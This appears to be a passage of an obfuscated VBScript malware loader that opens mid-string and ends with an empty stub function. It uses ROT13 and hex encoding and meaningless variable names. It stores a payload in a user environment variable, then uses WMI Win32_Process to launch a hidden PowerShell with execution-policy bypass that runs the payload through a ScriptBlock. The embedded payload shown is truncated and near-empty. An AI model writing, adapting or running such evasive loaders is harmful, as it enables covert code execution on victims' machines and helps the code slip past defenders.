ɝⶥ⤃⣢¨6ɝⶥ⤃⣢¨8ɝⶥ⤃⣢¨7ɝⶥ⤃⣢¨Bɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨7ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Dɝⶥ⤃⣢¨0ɝⶥ⤃⣢¨Aɝⶥ⤃⣢¨"
classman = ""
donated = Split(CStr(screens), "ɝⶥ⤃⣢¨")
For Violetta = 0 To UBound(donated)
    classman = classman & donated(Violetta)
Next

classman = Trim(classman)
trihydrides = Chr(38) & Chr(72) 
sabulose = ""

For teethes = 1 To Len(classman) Step 2
    sabulose = sabulose & Chr(CInt(trihydrides & Mid(classman, teethes, 2)))
Next

Dim intervises, apoplexy, illify, beaumontague, hussies, polariser
Dim deconjugations, dalie, enaliornis, gonocalyx

intervises = Array( _
    "VAGREANY_QO_PNPUR", _
    "cbjrefuryy.rkr -RkrphgvbaCbyvpl Olcnff -AbCebsvyr -JvaqbjFglyr Uvqqra -Pbzznaq", _
    "VRK $rai:", _
    ";[Raivebazrag]::FrgRaivebazragInevnoyr" _
)

For polariser = 0 To UBound(intervises)
    apoplexy = intervises(polariser)
    illify = ""
    For hussies = 1 To Len(apoplexy)
        beaumontague = Asc(Mid(apoplexy, hussies, 1))
        If (beaumontague >= 65 And beaumontague <= 77) Or (beaumontague >= 97 And beaumontague <= 109) Then
            illify = illify & Chr(beaumontague + 13)
        ElseIf (beaumontague >= 78 And beaumontague <= 90) Or (beaumontague >= 110 And beaumontague <= 122) Then
            illify = illify & Chr(beaumontague - 13)
        Else
            illify = illify & Mid(apoplexy, hussies, 1)
        End If
    Next
    intervises(polariser) = illify
Next

deconjugations    = intervises(0)
dalie     = intervises(1)
enaliornis     = intervises(2)
gonocalyx     = intervises(3)

Dim blowzy, metallographer, parasitological, invendibility, decennaS, decennaSt, decennaP, rebreather

Set blowzy = CreateObject("WScript.Shell")
Set metallographer = blowzy.Environment("User")
metallographer(deconjugations) = sabulose

parasitological = Chr(38) & " ([ScPEMripPEMtBPEMloPEMck]::CPEMrPEMeate(${env:" & deconjugations & "}))"
parasitological = Replace(parasitological, "PEM", "")
invendibility = dalie & " """ & parasitological & """"

rebreather = Array("77696e6d676d74733a726f6f745c63696d7632", "57696e33325f50726f6365737353746172747570", "57696e33325f50726f63657373")

For polariser = 0 To UBound(rebreather)
    classman = rebreather(polariser)
    illify = ""
    For teethes = 1 To Len(classman) Step 2
        illify = illify & Chr(CInt(trihydrides & Mid(classman, teethes, 2)))
    Next
    rebreather(polariser) = illify
Next

decennaS  = rebreather(0)
decennaSt = rebreather(1)
decennaP  = rebreather(2)

Dim hemerocallis, rytina, satinity, coffined

Set hemerocallis = GetObject(decennaS)
Set rytina = hemerocallis.Get(decennaSt).SpawnInstance_

rytina.ShowWindow = 0 

satinity = hemerocallis.Get(decennaP).Create(invendibility, Null, rytina, coffined)

Set metallographer = Nothing
Set blowzy = Nothing
Set hemerocallis = Nothing
Set rytina = Nothing

Function Marsalas(ByVal mofussilite, ByVal transsummer, ByVal method)
End Function
